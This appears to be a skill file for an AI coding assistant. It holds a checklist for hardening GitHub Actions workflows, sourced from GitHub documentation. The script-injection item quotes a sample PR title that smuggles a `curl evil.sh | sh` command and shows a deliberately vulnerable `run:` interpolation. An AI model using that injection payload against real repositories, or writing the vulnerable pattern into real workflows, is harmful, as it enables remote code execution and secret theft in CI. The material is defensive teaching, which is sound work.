---
name: github-actions-security
description: Apply GitHub's official security-hardening guidance (action pinning, least-privilege permissions, script-injection prevention, OIDC over long-lived secrets, safe pull_request_target/workflow_run usage) whenever creating a new GitHub Actions workflow or editing an existing one under .github/workflows/**. Use this any time the user asks to add, update, refactor, or review a workflow file — not just when they mention "security" explicitly.
---

# /github-actions-security — harden GitHub Actions workflows

Checklist sourced from GitHub's own documentation, GitHub Security Lab, and the OpenSSF
Scorecard project (see Sources below, checked 2026-07). Apply it any time you touch a file
under `.github/workflows/**`, whether the user asked for security work specifically or just
"add a workflow" / "update this workflow."

Don't use this to justify a drive-by rewrite of an entire workflow file for a one-line change —
apply the checklist to what you're touching, and call out (don't silently fix) anything larger
like a repo-wide SHA-pinning sweep before doing it.

## Checklist

1. **Pin third-party `uses:` to a full-length commit SHA, not a tag or branch.** A tag can be
   moved by whoever controls the action's repo; a SHA can't. Keep the version as a trailing
   comment so it stays human-readable and so Dependabot's `github-actions` ecosystem can still
   open PRs to bump it:
   ```yaml
   # avoid
   uses: actions/checkout@v7
   # prefer
   uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.0
   ```
   First-party `actions/*` actions are lower risk than random marketplace actions, but still pin
   anything that touches secrets, publishes artifacts, or runs on `pull_request_target`.

2. **Set `permissions:` explicitly, at the workflow level, to the minimum the least-privileged
   job needs** (commonly `contents: read`, or `{}` if no job even needs that). Grant broader
   scopes (`id-token: write`, `pull-requests: write`, `contents: write`, ...) only on the specific
   job that requires them, not workflow-wide.

3. **Never let an untrusted context value flow directly into `run:` via `${{ }}`.** Any
   `github.event.*` field ending in `title`, `body`, `message`, `label`, `name`, `head_ref`,
   `ref`, `email`, `default_branch`, or `page_name` — plus fork branch names in general — can
   contain shell metacharacters an attacker controls (e.g. a PR title of `a"; curl evil.sh | sh #`
   breaks out of a naive `VAR="${{ ... }}"` assignment). Route it through `env:` instead, so the
   value is passed as data, not spliced into the script text:
   ```yaml
   # vulnerable
   - run: echo "${{ github.event.pull_request.title }}"
   # safe
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: echo "$TITLE"
   ```
   Prefer a maintained action over an inline script wherever one exists and is trustworthy — it
   moves the untrusted value handling off of shell interpolation entirely.

4. **Avoid `pull_request_target` unless you specifically need secrets/write-access on a
   fork's PR** (e.g. posting a comment). If you do use it, never check out the PR's head ref
   while secrets are in scope, and never run any step derived from the PR's contents before a
   permissions/author-association check. `workflow_run` is usually the safer trigger when what
   you actually need is privilege separation between "run untrusted code" and "do something
   privileged with the result."

5. **Use OIDC (`permissions: id-token: write`) instead of long-lived secrets** for anything that
   supports federated auth — package registries (PyPI/npm trusted publishing), cloud providers
   (AWS/GCP/Azure). Scope the trust policy narrowly (specific repo + workflow + environment) and
   put the job behind a GitHub Environment with required reviewers for anything that publishes or
   deploys.

6. **Scope triggers to what the workflow actually needs**: explicit `branches:`/`paths:` filters
   instead of running on everything, a `concurrency` group with `cancel-in-progress: true` so
   superseded runs don't pile up, and `if: github.event.pull_request.draft == false` (or an
   equivalent job gate) for jobs that don't need to run against a draft. This isn't just
   cost hygiene — a broader trigger surface is a broader attack surface.

7. **Treat every third-party action as untrusted code until reviewed.** Check what it does with
   secrets and network access before adding it; prefer actions from verified creators or with a
   healthy OpenSSF Scorecard; re-review the diff on every version bump, which the SHA pin makes
   an explicit, visible change instead of a silent tag move.

8. **Turn on repo-level backstops** (one-time, not per-workflow): Dependabot updates for the
   `github-actions` ecosystem so SHA pins get bumped automatically, CodeQL with `javascript`
   added to the language matrix even in a non-JS repo (the workflow-injection queries live in
   that query suite), and a CODEOWNERS entry requiring review on changes to
   `.github/workflows/**`.

9. **Self-hosted runners**: don't use them for public repositories unless the job can never run
   attacker-controlled code (no fork PRs reaching them); keep them ephemeral/just-in-time; put
   them in a dedicated runner group so a compromised job can't reach unrelated repos' runners.

## Sources

- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) — GitHub Docs
- [Script injections](https://docs.github.com/en/actions/concepts/security/script-injections) — GitHub Docs
- [Controlling permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token) — GitHub Docs
- [How to secure GitHub Actions workflows: 4 tips](https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/) — The GitHub Blog
- [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) — GitHub Security Lab
- [OpenSSF Scorecard](https://scorecard.dev/) and [scorecard/docs/checks.md](https://github.com/ossf/scorecard/blob/main/docs/checks.md) — pinned-dependencies and token-permissions checks
